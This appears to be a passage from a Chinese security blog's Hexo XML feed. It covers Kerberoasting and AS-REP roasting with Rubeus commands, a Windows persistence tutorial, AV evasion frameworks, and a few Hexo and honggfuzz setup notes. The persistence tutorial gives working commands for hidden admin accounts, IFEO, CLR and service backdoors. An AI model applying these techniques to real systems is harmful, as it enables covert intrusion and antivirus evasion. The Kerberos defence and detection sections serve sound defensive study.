Centre，密钥分发中心，此处为域控），进行身份认证。</p><p>2、KDC验证用户的凭据，如果凭据有效，则返回TGT（Ticket-Granting Ticket，票据授予票据）。</p><p>3、如果用户想通过身份认证，访问某个服务（如IIS），那么他需要发起（Ticket Granting Service，票据授予服务）请求，请求中包含TGT以及所请求服务的SPN（Service Principal Name，服务主体名称）。</p><p>4、如果TGT有效并且没有过期，TGS会创建用于目标服务的一个服务票据。服务票据使用服务账户的凭据进行加密。</p><p>5、用户收到包含加密服务票据的TGS响应数据包。</p><p>6、最后，服务票据会转发给目标服务，然后使用服务账户的凭据进行解密。</p><p>整个过程比较简单，我们需要注意的是，服务票据会使用服务账户的哈希进行加密，这样一来，Windows域中任何经过身份验证的用户都可以从TGS处请求服务票据，然后离线暴力破解。</p><p>5.2 实战手法</p><p>1.SPN扫描具有服务帐户的SQL Server</p><p><img src="/images/pasted-12.png" alt="upload successful"></p><p>2.确定目标之后，我们使用PowerShell请求此服务主体名称（SPN）的服务票证。</p><p><img src="/images/pasted-13.png" alt="upload successful"></p><p>查看数据包捕获，我们可以看到Kerberos通信，并注意到票证是RC4-HMAC-MD5。</p><p><img src="/images/pasted-14.png" alt="upload successful"></p><p>3.客户端收到票证后，我们可以使用Mimikatz（或其他）导出用户存储空间中的所有Kerberos票证。</p><p><img src="/images/pasted-15.png" alt="upload successful"></p><p>4.将服务票证导出到文件后，可以将该文件发送到运行带有Kerberoast的Kali Linux的攻击者计算机。破解与票证（文件）相关的服务帐户的密码。</p><p><img src="/images/pasted-16.png" alt="upload successful"><br>tips:</p><p>由于服务帐户通常在许多企业中被过度使用，并且密码通常很弱，因此这是我们从域用户转到域管理员的简便方法。</p><p>5.3 防御手法<br>确保所有服务帐户（具有服务主体名称的用户帐户）使用的长而复杂的密码必须大于25个字符，最好为30个或更多。这使得破解这些密码更加困难。具有较高AD权限的服务帐户应重点确保其具有长而复杂的密码。确保定期更改所有服务帐户密码（每年至少更改一次）。如果可能，请使用组管理的服务帐户，这些帐户具有随机的复杂密码（&gt; 100个字符），并由Active Directory自动管理。</p><p>5.4 检测<br>由于要在用户需要访问资源时始终请求服务票证（Kerberos TGS票证），因此检测要困难得多。<br>寻找带有RC4加密的TGS-REQ数据包可能是最好的方法，尽管可能会出现误报。<br>通过启用Kerberos服务票证请求监视（“审核Kerberos服务票证操作”）并搜索具有过多4769事件（Eventid 4769 “已请求Kerberos服务票证”）的用户，可以监视Active Directory中的多个Kerberos服务票证请求。</p><h3 id="6-0-AS-REP-Roasting"><a href="#6-0-AS-REP-Roasting" class="headerlink" title="6.0 AS-REP Roasting"></a>6.0 AS-REP Roasting</h3><p>AS-REP Roasting是针对不需要预身份验证的用户帐户的Kerberos攻击。</p><p>预身份验证是Kerberos身份验证的第一步，旨在防止暴力破解密码猜测攻击。</p><p>在预身份验证期间，用户将输入其密码，该密码将用于加密时间戳，然后域控制器将尝试对其进行解密，并验证是否使用了正确的密码，并且该密码不会重播先前的请求。发出TGT，供用户将来使用。</p><p>如果禁用了预身份验证（DONT_REQ_PREAUTH），则我们可以为任何用户请求身份验证数据，那么DC将返回的加密TGT，我们就可以离线暴力破解的加密TGT。</p><p>默认情况下，Active Directory中需要预身份验证。但是，可以通过每个用户帐户上的用户帐户控制设置来控制此设置。</p><p>Under normal operations in a Windows Kerberos environment, when you<br>initiate a TGT request for a given user (Kerberos AS-REQ, message type<br>10) you have to supply a timestamp encrypted with that user’s<br>key/password. This structure is PA-ENC-TIMESTAMP and is embedded in<br>PA-DATA (preauthorization data) of the AS-REQ – both of these<br>structure are described in detail on page 60 of RFC4120 and were<br>introduced in Kerberos Version 5. The KDC then decrypts the timestamp<br>to verify if the subject making the AS-REQ really is that user, and<br>then returns the AS-REP and continues with normal authentication<br>procedures.</p><p>Note: the KDC does increase the badpwdcount attribute for any<br>incorrect PA-ENC-TIMESTAMP attempts, so we can’t use this as a method<br>to online brute-force account passwords :(</p><p>The reason for Kerberos preauthentication is to prevent offline<br>password guessing. While the AS-REP ticket itself is encrypted with<br>the service key (in this case the krbtgt hash) the AS-REP “encrypted<br>part” is signed with the client key, i.e. the key of the user we send<br>an AS-REQ for. If preauthentication isn’t enabled, an attacker can<br>send an AS-REQ for any user that doesn’t have preauth required and<br>receive a bit of encrypted material back that can be cracked offline<br>to reveal the target user’s password.</p><p>在现代Windows环境中，所有用户帐户都需要Kerberos预身份验证，但默认情况下，Windows会在不进行预身份验证的情况下尝试进行AS-REQ / AS-REP交换，而后一次在第二次提交时提供加密的时间戳：</p><p>6.1 实战手法</p><ol><li>用Rubeus进行AS-REP</li></ol><p>Rubeus是用于原始Kerberos交互和滥用的C＃工具集。</p><p> Rubeus.exe asreproast</p><p><img src="/images/pasted-17.png" alt="upload successful"><br>这将自动查找所有不需要预身份验证的帐户，并提取脱机破解所需的加密TGT数据</p><p>我们也可以使用以下命令以Hashcat可以离线破解的格式提取数据对这种哈希执行快速的暴力破解密码。</p><p>Rubeus.exe asreproast /format:hashcat /outfile:C:Temphashes.txt<br>它将AS-REP哈希信息输出到文本文件。</p><p><img src="/images/pasted-18.png" alt="upload successful"></p><p>对特定用户进行攻击</p><p>Rubeus.exe asreproast /user:TestOU3user</p><p><img src="/images/pasted-19.png" alt="upload successful"><br>6.2 防御手法<br>识别不需要预身份验证的帐户<br>免受此类攻击的明显保护是找到并删除设置为不需要Kerberos预身份验证的用户帐户的所有实例。</p><h3 id="7-0-MS14-068伪造的PAC利用"><a href="#7-0-MS14-068伪造的PAC利用" class="headerlink" title="7.0 MS14-068伪造的PAC利用"></a>7.0 MS14-068伪造的PAC利用</h3><h3 id="8-0-钻石PAC-使用金票和MS14-068伪造PAC的混合攻击"><a href="#8-0-钻石PAC-使用金票和MS14-068伪造PAC的混合攻击" class="headerlink" title="8.0 钻石PAC 使用金票和MS14-068伪造PAC的混合攻击"></a>8.0 钻石PAC 使用金票和MS14-068伪造PAC的混合攻击</h3><h3 id="9-0-Skeleton-Key攻击"><a href="#9-0-Skeleton-Key攻击" class="headerlink" title="9.0 Skeleton Key攻击"></a>9.0 Skeleton Key攻击</h3>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>honggfuzz_问题解惑</title>
      <link href="2021/01/20/honggfuzz-wen-ti-jie-huo-1/"/>
      <url>2021/01/20/honggfuzz-wen-ti-jie-huo-1/</url>
      
        <content type="html"><![CDATA[<h2 id="honggfuzz-安装常遇到的问题"><a href="#honggfuzz-安装常遇到的问题" class="headerlink" title="honggfuzz 安装常遇到的问题"></a>honggfuzz 安装常遇到的问题</h2><h5 id="解惑方法一"><a href="#解惑方法一" class="headerlink" title="解惑方法一"></a>解惑方法一</h5><p>问题一：</p><p>linux/bfd.c:28:10: fatal error: bfd.h: No such file or directory<br> #include &lt;bfd.h&gt;<br>          ^~~~~~~<br>compilation terminated.<br>Makefile:259: recipe for target ‘linux/bfd.o’ failed<br>make: *** [linux/bfd.o] Error 1</p><p>这是因为没有 binutils-dev</p><p>apt-get install binutils-dev</p><p>问题二：</p><p>linux/unwind.c:27:10: fatal error: libunwind-ptrace.h: No such file or directory<br> #include &lt;libunwind-ptrace.h&gt;<br>          ^~~~~~~~~~~~~~~~~~~~<br>compilation terminated.<br>Makefile:259: recipe for target ‘linux/unwind.o’ failed<br>make: *** [linux/unwind.o] Error 1</p><p>如果提示以下错误，这是因为没有 libunwind-dev</p><p>apt-get install libunwind-dev</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>hexo博客各种插件安装和问题解惑</title>
      <link href="2021/01/17/hexo-bo-ke-ge-chong-cha-jian-an-zhuang-he-wen-ti-jie-huo/"/>
      <url>2021/01/17/hexo-bo-ke-ge-chong-cha-jian-an-zhuang-he-wen-ti-jie-huo/</url>
      
        <content type="html"><![CDATA[<h2 id="hexo-问题解惑-amp-amp-各种插件安装"><a href="#hexo-问题解惑-amp-amp-各种插件安装" class="headerlink" title="hexo 问题解惑&amp;&amp;各种插件安装"></a>hexo 问题解惑&amp;&amp;各种插件安装</h2><p>summer13</p><h3 id="一，高亮"><a href="#一，高亮" class="headerlink" title="一，高亮"></a>一，高亮</h3><p>由于 Hexo 自带的代码高亮主题显示不好看，所以主题中使用到了 hexo-prism-plugin 的 Hexo 插件来做代码高亮，安装命令如下：</p><p>bash<br>npm i -S hexo-prism-plugin<br>然后，修改 Hexo 根目录下 _config.yml 文件中 highlight.enable 的值为 false，并新增 prism 插件相关的配置，主要配置如下：</p><p>highlight:<br>  enable: false</p><p>prism_plugin:<br>  mode: ‘preprocess’    # realtime/preprocess<br>  theme: ‘tomorrow’<br>  line_number: false    # default false<br>  custom_css:</p><h3 id="二，搜索"><a href="#二，搜索" class="headerlink" title="二，搜索"></a>二，搜索</h3><p>本主题中还使用到了 hexo-generator-search 的 Hexo 插件来做内容搜索，安装命令如下：</p><p>bash<br>npm install hexo-generator-search –save<br>在 Hexo 根目录下的 _config.yml 文件中，新增以下的配置项：</p><p>yaml<br>search:<br>  path: search.xml<br>  field: post</p><h3 id="三，中文链接转拼音（可选的）"><a href="#三，中文链接转拼音（可选的）" class="headerlink" title="三，中文链接转拼音（可选的）"></a>三，中文链接转拼音（可选的）</h3><p>如果你的文章名称是中文的，那么 Hexo 默认生成的永久链接也会有中文，这样不利于 SEO，且 gitment 评论对中文链接也不支持。我们可以用 hexo-permalink-pinyin Hexo 插件使在生成文章时生成中文拼音的永久链接。</p><p>安装命令如下：</p><p>bash<br>npm i hexo-permalink-pinyin –save<br>在 Hexo 根目录下的 _config.yml 文件中，新增以下的配置项：</p><p>yaml<br>permalink_pinyin:<br>  enable: true<br>  separator: ‘-‘ # default: ‘-‘</p><h3 id="四，文章字数统计插件（可选的）"><a href="#四，文章字数统计插件（可选的）" class="headerlink" title="四，文章字数统计插件（可选的）"></a>四，文章字数统计插件（可选的）</h3><p>如果你想要在文章中显示文章字数、阅读时长信息，可以安装 hexo-wordcount插件。</p><p>安装命令如下：</p><p>bash<br>npm i –save hexo-wordcount<br>然后只需在本主题下的 _config.yml 文件中，激活以下配置项即可：</p><p>yaml<br>wordCount:<br>  enable: false # 将这个值设置为 true 即可.<br>  postWordCount: true<br>  min2read: true<br>  totalCount: true</p><h3 id="五，添加-RSS-订阅支持（可选的）"><a href="#五，添加-RSS-订阅支持（可选的）" class="headerlink" title="五，添加 RSS 订阅支持（可选的）"></a>五，添加 RSS 订阅支持（可选的）</h3><p>本主题中还使用到了 hexo-generator-feed 的 Hexo 插件来做 RSS，安装命令如下：</p><p>bash<br>npm install hexo-generator-feed –save<br>在 Hexo 根目录下的 _config.yml 文件中，新增以下的配置项：</p><p>yaml<br>feed:<br>  type: atom<br>  path: atom.xml<br>  limit: 20<br>  hub:<br>  content:<br>  content_limit: 140<br>  content_limit_delim: ‘ ‘<br>  order_by: -date<br>执行 hexo clean &amp;&amp; hexo g 重新生成博客文件，然后在 public 文件夹中即可看到 atom.xml 文件，说明你已经安装成功了。</p><h3 id="六，hexo可视化编辑"><a href="#六，hexo可视化编辑" class="headerlink" title="六，hexo可视化编辑"></a>六，hexo可视化编辑</h3><p>先安装hexo admin</p><p>npm install –save hexo-admin</p><p>安装完成后启动服务</p><p>hexo server -d<br>然后打开localhost:4000/admin/就可以了然后打开</p>]]></content>
      
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> 解惑 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网页博客加密的各种姿势</title>
      <link href="2021/01/16/wang-ye-bo-ke-jia-mi-de-ge-chong-zi-shi/"/>
      <url>2021/01/16/wang-ye-bo-ke-jia-mi-de-ge-chong-zi-shi/</url>
      
        <content type="html"><![CDATA[<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><h3 id="首先输入命令："><a href="#首先输入命令：" class="headerlink" title="首先输入命令："></a>首先输入命令：</h3><p>npm install hexo-encrypt –save<br>等待安装完成后，修改博客配置文件_config.yml。<br>(切记不是hexo博客框架的_config.yml文件)<br>在末尾添加：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">encrypt: </span><br><span class="line">  password: 123456</span><br></pre></td></tr></table></figure><p>这里的123456为默认密码，即若文章加密并且未声明独立密码即可通过默认密码解锁文章。</p><p>然后在package.json中修改插件的版本号，修改为”hexo-encrypt”: “^0.2.0”。</p><h3 id="然后在每一篇文章的开头加入："><a href="#然后在每一篇文章的开头加入：" class="headerlink" title="然后在每一篇文章的开头加入："></a>然后在每一篇文章的开头加入：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">encrypt: true</span><br><span class="line">  enc_pwd: 123456</span><br></pre></td></tr></table></figure><p>这里的enc_pwd为独立密码，设定独立密码后文章不再使用默认密码解锁，改用独立密码解锁。</p><h3 id="输入hexo-s即可查看效果。"><a href="#输入hexo-s即可查看效果。" class="headerlink" title="输入hexo s即可查看效果。"></a>输入hexo s即可查看效果。</h3><p>注意若修改完插件或密码需要先hexo clean清空缓存。</p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p> hexo-theme-matery<br> 加密更加简单<br> 找到hexo-theme-matery(不是hexo框架哦)  更目录下_config.yml文件下,找到<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">verifyPassword:</span><br><span class="line"> enable: true</span><br><span class="line"> promptMessage: 这是高级进阶博客，只属于定制（欢迎破解，加入13summer-Team），请输入访问本文章的密码</span><br><span class="line"> errorMessage: 密码错误，将返回主页！</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>把enable：false 改为true</p><p>然后在你的.md 文件title中加入<br>password: 123456(sha256)</p><p>password后面放的是sha256加密的hash值，不可写明文密码（防止泄漏）</p><p>sha256:<a href="http://tool.chinaz.com/tools/hash.aspx">站长之家</a></p><p>sha256:<a href="https://tool.oschina.net/encrypt?type=2">开源在线工具</a></p><p>sha256:<a href="http://encode.chahuo.com/">chahuo</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 加密 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>13summer-2021年-视频课程计划</title>
      <link href="2021/01/13/13summer-shi-pin-ke-cheng-ji-hua/"/>
      <url>2021/01/13/13summer-shi-pin-ke-cheng-ji-hua/</url>
      
        <content type="html"><![CDATA[<h2 id="–2021年渗透学习计划–"><a href="#–2021年渗透学习计划–" class="headerlink" title="–2021年渗透学习计划–"></a>–2021年渗透学习计划–</h2><p>本课程为2021年最新课程，属于高级进阶版，在线更新，需要的联系作者；后续作者将推出，渗透测试基础教程；</p><p>本课程之用作教学，艺术，多方为技巧专研，切勿用作非法用途！——————————————饭我中华，虽远必黑！</p><h3 id="大纲"><a href="#大纲" class="headerlink" title="大纲"></a>大纲</h3><h5 id="一-内网渗透"><a href="#一-内网渗透" class="headerlink" title="一. 内网渗透**"></a>一. 内网渗透**</h5><ol><li>内网渗透</li><li>conbalt_strike</li><li>linux_提权</li><li>windows_提权</li><li>后门（msf,cs）</li><li>持久化</li><li>注入</li><li>木马的通信协议</li></ol><h5 id="二-hook（windows-linux-android）"><a href="#二-hook（windows-linux-android）" class="headerlink" title="二.hook（windows/linux/android） **"></a>二.hook（windows/linux/android） **</h5><ol><li>驱动层hook(windows)<br>IRP hook<br>Object hook<br>SSDT hook<br>SSSDT hook<br>VT hook</li></ol><ol start="2"><li>驱动注入(windows)<br>远程线程注入<br>APC 注入<br>IAT 注入<br>全局内存注入</li></ol><ol start="3"><li>linux下hook及注入<br>内联（inline）hook<br>GOT hook</li></ol><p>ELF 注入<br>GOT 注入<br>ftrace 注入<br>反射注入</p><ol start="4"><li><p>R0 层hook及注入(linux)<br>SYSCALL hook<br>oops hook<br>IDT hook<br>GOT 注入<br>ftrace 注入</p></li><li><p>android<br>内联 hook<br>内联 hook(armv8)<br>GOT hook<br>JNI 技术<br>Native java hook<br>ART/Dalvik hook<br>Xposed 框架使用<br>frida</p></li></ol><h5 id="三-提权"><a href="#三-提权" class="headerlink" title="三.提权**"></a>三.提权**</h5><ol><li><p>linux:<br>linux 内核漏洞提权<br>linux SUID 提权<br>GNU C library动态链接区 $ORIGIN溢出提权<br>linux mysql udf提权<br>LINUX CRON JOBS提权<br>metasploit linux提权<br>ssh私钥解密+ 系统提权（溢出提权）</p></li><li><p>windows:<br>WINDOWS 系统溢出提权<br>WINDOWS ASPX溢出提权<br>MYSQL UDF 提权<br>SQLSERVER 提权<br>WINDOWS SERVER2008 R2 溢出提权<br>LPK 劫持提权<br>MOF 提权<br>ZEND 反弹SHELL提权<br>FileZilla 提权<br>metasploit windows 提权<br>msf 结合漏洞审计工具提权</p></li></ol><h5 id="四-免杀-自启动"><a href="#四-免杀-自启动" class="headerlink" title="四.免杀-自启动 **"></a>四.免杀-自启动 **</h5><p>windows:<br>msf 免杀<br>cobalt strike 免杀<br>4种常用的免杀框架</p><p>linux:</p><p>android:</p><hr><p>难点详解扩展</p>]]></content>
      
      
      
        <tags>
            
            <tag> 视频 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows提权-组合拳</title>
      <link href="2021/01/13/windows-ti-quan-zu-he-quan/"/>
      <url>2021/01/13/windows-ti-quan-zu-he-quan/</url>
      
        <content type="html"><![CDATA[<h2 id="windows-提权总结"><a href="#windows-提权总结" class="headerlink" title="windows 提权总结"></a>windows 提权总结</h2><h5 id="ms11-080提权"><a href="#ms11-080提权" class="headerlink" title="ms11-080提权"></a>ms11-080提权</h5><p>提权环境xp系统（英文版）<br>如果是中文版（就变成成了DDOS 会出现蓝屏）</p><h5 id="ms14-068"><a href="#ms14-068" class="headerlink" title="ms14-068"></a>ms14-068</h5>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>linxu提权-组合拳</title>
      <link href="2021/01/13/linxu-ti-quan-zu-he-quan/"/>
      <url>2021/01/13/linxu-ti-quan-zu-he-quan/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Cobalt_Strike</title>
      <link href="2021/01/13/cobalt-strike/"/>
      <url>2021/01/13/cobalt-strike/</url>
      
        <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><h4 id="AV查杀的四种方式"><a href="#AV查杀的四种方式" class="headerlink" title="AV查杀的四种方式"></a>AV查杀的四种方式</h4><p>文件,内存，流量，行为。</p><p>免杀方式</p><pre><code>加壳多平台多语言生成shellcode加密shellcode 加载插入正常文件白名单加载</code></pre><h3 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h3><p>这几款是比较热门的,但是感觉效果一般了。</p><pre><code>面纱 https://github.com/Veil-Framework/Veil幻影逃避 https://github.com/oddcod3/Phantom-Evasion剥壳机 https://www.shellterproject.com/download/Avet https://github.com/govolution/avet</code></pre><p>总的来说支持msf的免杀框架都能用来免杀CS，因为他们的通讯是相通的，免杀msf用CS上线也是一样。 </p>]]></content>
      
      
      <categories>
          
          <category> Cobaltstrike </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
            <tag> 远控 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows后门持久化</title>
      <link href="2021/01/07/windows-hou-men-chi-jiu-hua/"/>
      <url>2021/01/07/windows-hou-men-chi-jiu-hua/</url>
      
        <content type="html"><![CDATA[<h2 id="windows-后门持久化"><a href="#windows-后门持久化" class="headerlink" title="windows 后门持久化"></a>windows 后门持久化</h2><p>shift后门<br>映像劫持<br>注册表自启动项<br>定时任务<br>用户登陆初始化<br>Logon Scripts<br>屏幕保护程序<br>自启动服务<br>影子用户<br>waitfor<br>CLR<br>Hijack CAccPropServicesClass and MMDeviceEnumerator<br>劫持MruPidlList<br>office系列<br>Word WLL<br>Excel XLL<br>PowerPoint VBA add-ins<br>文件关联<br>AppInit_DLLs<br>Netsh helper<br>利用BITS<br>利用inf文件实现后门</p><p><img src="hacker1.jpeg"></p><h3 id="shift后门"><a href="#shift后门" class="headerlink" title="shift后门"></a>shift后门</h3><p>这个是比较老的方式了，这里简单讲一下，在windows中有一些辅助功能，能在用户未登录系统之前可以通过组合键来启动它，类似的辅助功能有：</p><p>C:\Windows\System32\sethc.exe 粘滞键，启动快捷键：按五次shift键<br>C:\Windows\System32\utilman.exe 设置中心，启动快捷键：Windows+U键<br>在低版本的windows中，我们可以直接把setch.exe替换成我们的后门程序，下面我们把setch.exe替换为cmd.exe</p><h3 id="映像劫持"><a href="#映像劫持" class="headerlink" title="映像劫持"></a>映像劫持</h3><p>这个和shift后门差不多，只不过在低版本的windows中，我们可以简单地替换程序，但是在高版本的windows版本中替换的文件受到了系统的保护，所以这里我们要使用另外一个知识点：映像劫持。</p><p>“映像劫持”，也被称为”IFEO”（Image File Execution Options）</p><p>就是Image File Execution Options（其实应该称为”image Hijack”。）是为一些在默认系统环境中运行时可能引发错误的程序执行体提供特殊的环境设定。由于这个项主要是用来调试程序用的，对一般用户意义不大。默认是只有管理员和local system有权读写修改。<br>PS：来自百度百科<br>简单来说就是当目标程序被映像劫持时，当我们启动目标程序时，启动的是劫持后的程序而不是原来的程序</p><p>操作也很简单，在注册表的HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Option下添加一个项sethc.exe，然后在sethc.exe这个项中添加debugger键，键值为我们恶意程序的路径，如下图</p><h3 id="注册表自启动项"><a href="#注册表自启动项" class="headerlink" title="注册表自启动项"></a>注册表自启动项</h3><p>MSF的Persistence模块利用的就是写注册表自启动项来实现的，一般自启动项是这两个键：Run和RunOnce，两者的区别如下</p><p>Run：该项下的键值即为开机启动项，每一次随着开机而启动。</p><p>RunOnce：RunOnce和Run差不多，唯一的区别就是RunOnce的键值只作用一次，执行完毕后就会自动删除</p><p>常见注册表启动项键的位置：</p><p>用户级</p><p>\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run<br>\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce<br>系统级</p><p>\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run<br>\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce<br>\HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run<br>\HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce<br>定时任务<br>windows下定时任务的命令有两个分别是：at和schtasks，他们两者主要区别是at命令在win7、08等高版本的windows中是不能将任务在前台执行的，也就是只会打开一个后台进程，而schtasks是将定时的任务在前台执行，下面我们逐个看看</p><p>at的一些参数</p><p>AT [\computername] time [/INTERACTIVE]<br>[ /EVERY:date[,…] | /NEXT:date[,…]] “command”</p><p>schtasks一些参数：</p><p>schtasks /create /tn TaskName /tr TaskRun /sc schedule [/mo modifier] [/d day] [/m month[,month…] [/i IdleTime] [/st StartTime] [/sd StartDate] [/ed EndDate] [/s computer [/u [domain]user /p password]] [/ru {[Domain]User | “System”} [/rp Password]] /?<br>schtasks的执行如下：</p><h3 id="用户登陆初始化"><a href="#用户登陆初始化" class="headerlink" title="用户登陆初始化"></a>用户登陆初始化</h3><p>Userinit的作用是用户在进行登陆初始化设置时，WinLogon进程会执行指定的login scripts，所以我们可以修改它的键值来添加我们要执行的程序</p><p>注册表路径为：HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit，我们添加一个我们启动的程序，多个程序用逗号隔开</p><h3 id="Logon-Scripts"><a href="#Logon-Scripts" class="headerlink" title="Logon Scripts"></a>Logon Scripts</h3><p>Logon Scripts优先于av先执行，我们可以利用这一点来绕过av的敏感操作拦截</p><p>注册表路径为：HKEY_CURRENT_USER\Environment，创建一个键为：UserInitMprLogonScript，其键值为我们要启动的程序路径</p><h3 id="屏幕保护程序"><a href="#屏幕保护程序" class="headerlink" title="屏幕保护程序"></a>屏幕保护程序</h3><p>在对方开启屏幕保护的情况下，我们可以修改屏保程序为我们的恶意程序从而达到后门持久化的目的<br>其中屏幕保护的配置存储在注册表中，其位置为：HKEY_CURRENT_USER\Control Panel\Desktop，关键键值如下：</p><p>SCRNSAVE.EXE - 默认屏幕保护程序，我们可以把这个键值改为我们的恶意程序</p><p>ScreenSaveActive - 1表示屏幕保护是启动状态，0表示表示屏幕保护是关闭状态</p><p>ScreenSaverTimeout - 指定屏幕保护程序启动前系统的空闲事件，单位为秒，默认为900（15分钟）</p><h3 id="自启动服务"><a href="#自启动服务" class="headerlink" title="自启动服务"></a>自启动服务</h3><p>自启动服务一般是在电脑启动后在后台加载指定的服务程序，我们可以将exe文件注册为服务，也可以将dll文件注册为服务</p><p>为了方便起见我们可以直接用Metasploit来注册一个服务</p><p>meterpreter &gt; run metsvc -A</p><p>运行之后msf会在%TMP%目录下创建一个随机名称的文件夹，然后在该文件夹里面生成三个文件：metsvc.dll、metsvc-server.exe、metsvc.exe</p><p>同时会新建一个服务，其显示名称为Meterpreter，服务名称为metsvc，启动类型为”自动”，默认绑定在31337端口。</p><p>如果想删除服务，可以执行</p><p>meterpreter &gt; run metsvc -r</p><h3 id="影子用户"><a href="#影子用户" class="headerlink" title="影子用户"></a>影子用户</h3><p>影子用户顾名思义就是一个隐藏用户，只能通过注册表查看这个用户，其它方式是找不到这个用户的信息的</p><p>在用户名后面加一个$可以创建一个匿名用户，创建完毕后我们再把这个用户添加到administrator组</p><p>net user test$ test /add<br>net localgroup administrators test$ /add<br>可以看到net user是看不到我们创建的用户，但是计算机管理-用户和组中可以看到</p><p>所以这时候我们就需要修改一下注册表，其键位置为：HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users</p><p>注意：SAM键值默认是只能system权限修改的，所以我们要修改一下SAM键的权限，给予administrator完全控制和读取的权限</p><p>然后我们将administrator用户对应的项中的F值复制到test$对应xiang中的F值，然后保存</p><p>然后我们将test$删除掉</p><p>net user test$ /del<br>然后再双击导出的注册表文件，然后我们再看一下</p><p>net user和计算机管理-用户和组中都查看不到用户了，但是我们可以用net user test$查看用户信息</p><p>这个时候我们再用net user test$ /del是删除不掉这个用户的，只能通过注册表来删除。</p><h3 id="waitfor"><a href="#waitfor" class="headerlink" title="waitfor"></a>waitfor</h3><p>关于waitfor手册中是这么解释的：</p><p>在系统上发送或等待信号。waitfor可用于跨网络同步计算机。<br>waitfor的语法</p><p>waitfor [/s [/u [] [/p []]]] /si<br>waitfor [/t ]<br>参数解释：</p><p>/s <Computer>  指定远程计算机的名称或IP地址，默认为本地计算机<br>/u [<Domain>]<user>    使用指定用户帐户的凭据运行脚本。默认是使用当前用户的凭据。<br>/p <Password>  指定/u参数中指定的用户帐户的密码。<br>/si            发送指定激活信号。<br>/t             指定等待信号的秒数。默认为无限期等待。<br><SignalName>    指定等待或发送的信号，不区分大小写，长度不能超过225个字符<br>我们来测试一下看看</p><p>waitfor test &amp;&amp; calc 表示接收信号成功后执行计算器<br>waitfor /s 192.168.163.143 /u qiyou /p qiyou /si test<br>但是这样只能执行一次，这对我们后门持久化很不利，所以我们得想办法让它持久化。</p><p>这里就要借用一下三好师傅的powershell脚本：<a href="https://github.com/3gstudent/Waitfor-Persistence/blob/master/Waitfor-Persistence.ps1">https://github.com/3gstudent/Waitfor-Persistence/blob/master/Waitfor-Persistence.ps1</a></p><p>该方法的优点就是能主动激活，但是缺点也明显就是只能在同一网段才能接收和发送激活信号、服务器重启之后就不行了。</p><h3 id="CLR"><a href="#CLR" class="headerlink" title="CLR"></a>CLR</h3><p>CLR的简述（来自百度百科）</p><p>CLR(公共语言运行库,Common Language Runtime)和Java虚拟机一样也是一个运行时环境，是一个可由多种编程语言使用的运行环境。CLR的核心功能包括：内存管理、程序集加载、安全性、异常处理和线程同步，可由面向CLR的所有语言使用。并保证应用和底层操作系统之间必要的分离。CLR是.NET Framework的主要执行引擎。<br>需要注意的是CLR能够劫持系统中全部.net程序，而且系统默认会调用.net程序，从而导致我们的后门自动触发，这是我们后门持久化的一个好的思路，下面来实现一下</p><p>修改一下注册表，注册表路径：</p><p>HKEY_CURRENT_USER\Software\Classes\CLSID\，新建子项{11111111-1111-1111-1111-111111111111}（名字随便，只要不与注册表中存在的名称冲突就行），然后再新建子项InProcServer32，新建一个键ThreadingModel，键值为：Apartment，默认的键值为我们dll的路径<br>然后在cmd下设置一下：<br>PS：要注册为全局变量，不然只能在当前cmd窗口劫持.net程序</p><p>SETX COR_ENABLE_PROFILING=1 /M<br>SETX COR_PROFILER={11111111-1111-1111-1111-111111111111} /M<br>然后执行一波，效果如下，可以看到已经成功劫持了</p><h3 id="Hijack-CAccPropServicesClass-and-MMDeviceEnumerator"><a href="#Hijack-CAccPropServicesClass-and-MMDeviceEnumerator" class="headerlink" title="Hijack CAccPropServicesClass and MMDeviceEnumerator"></a>Hijack CAccPropServicesClass and MMDeviceEnumerator</h3><p>什么是COM（来自WIKI）</p><p>组件对象模型（英语：Component Object Model，缩写COM）是微软的一套软件组件的二进制接口标准。这使得跨编程语言的进程间通信、动态对象创建成为可能。COM是多项微软技术与框架的基础，包括OLE、OLE自动化、ActiveX、COM+、DCOM、Windows shell、DirectX、Windows 